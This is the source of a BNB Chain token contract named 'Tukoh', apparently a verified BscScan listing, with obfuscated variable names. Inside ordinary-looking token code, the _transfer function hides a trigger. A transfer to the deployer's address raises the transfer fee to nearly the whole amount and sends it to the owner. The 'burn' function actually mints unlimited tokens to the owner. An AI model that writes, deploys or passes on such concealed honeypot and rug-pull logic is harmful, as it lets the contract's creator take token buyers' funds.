/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 07:31 GMT
 */
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0;
contract EQHHFQT {
uint256 private  NDGDBS = 1000000000000000000000;
string public  symbol = "Tukoh";
uint256 private  WXYKUE = 10000000000000;
uint256 public constant TMUTGG = 99999;
address private  HQUDOU = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  EYKTAH = 10000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  HZVSAY = 1000000000000000000;
mapping (address => uint256) public balanceOf;
address public owner;
uint8 public constant decimals = 18;
address private  JCHARF = address(0);
string public  name = "Tukoh";
uint256 private  NRXFWX = 1000000000000000;
address private  SHPRIC = address(0);
address private  UJZRLK = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  PXMYJC = 1000000000000000000;
address private  UPHBXU = address(0);
uint256 private  RCHICE = 100000000;
function _getNDGDBS() private returns (uint256) {
return NDGDBS;
}

function _getSHPRIC() private returns (address) {
return SHPRIC;
}

function _getPXMYJC() private returns (uint256) {
return PXMYJC;
}

function _getEYKTAH() private returns (uint256) {
return EYKTAH;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getHQUDOU() private returns (address) {
return HQUDOU;
}

function _getWXYKUE() private returns (uint256) {
return WXYKUE;
}

function _getRCHICE() private returns (uint256) {
return RCHICE;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tRWWUZY 0");
require(spender != address(0), "fRWWUZY 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getUJZRLK() private returns (address) {
return UJZRLK;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
JCHARF = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getNRXFWX() private returns (uint256) {
return NRXFWX;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "RWWUZY");
require(to != address(0), "RWWUZY");
require(amount <= balanceOf[from], "RWWUZY");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* TMUTGG/HZVSAY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==JCHARF){
HZVSAY = TMUTGG+2;
}
emit Transfer(from, to, transferAmount);
}
function _getUPHBXU() private returns (address) {
return UPHBXU;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}